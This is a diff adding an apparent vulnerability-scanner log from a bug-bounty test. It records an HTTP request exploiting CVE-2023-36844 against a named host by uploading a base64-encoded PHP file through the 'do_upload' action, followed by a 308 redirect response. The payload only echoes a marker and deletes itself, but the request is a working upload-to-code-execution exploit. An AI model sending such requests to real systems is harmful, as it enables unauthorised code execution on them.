@@ -1,0 +1,30 @@
+[CVE-2023-36844] Dumped HTTP request for http://akurateco.bitpanda.com/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: akurateco.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "bcaac.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response http://akurateco.bitpanda.com/webauth_operation.php
+
+HTTP/1.1 308 Permanent Redirect
+Connection: close
+Content-Length: 164
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:48 GMT
+Location: https://akurateco.bitpanda.com/webauth_operation.php
+
+<html>
+<head><title>308 Permanent Redirect</title></head>
+<body>
+<center><h1>308 Permanent Redirect</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
